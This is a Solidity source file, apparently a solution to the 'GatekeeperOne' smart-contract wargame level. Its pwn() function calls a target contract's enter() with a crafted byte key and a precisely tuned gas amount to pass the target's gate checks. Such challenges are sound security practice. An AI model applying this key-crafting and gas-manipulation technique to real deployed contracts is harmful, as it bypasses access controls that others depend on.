// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

    function enter(bytes8 _gateKey) public returns (bool) {}
}

contract GatekeeperOneSol {

    address _addr = 0xB6d58b9b29487F708200Bc9A4cC51bE7D6395A0f;
    GatekeeperOne contr = GatekeeperOne(_addr);

    //In the last 8 digits, first 4 must be 0000, and last 4 must be the last 4 of calling wallet's address
    bytes8 b = 0x20010db80000f697;
    uint gasAmount = 8191 * 5 + 254;

    function pwn() external {
        contr.enter{gas: gasAmount}(b);
    }
}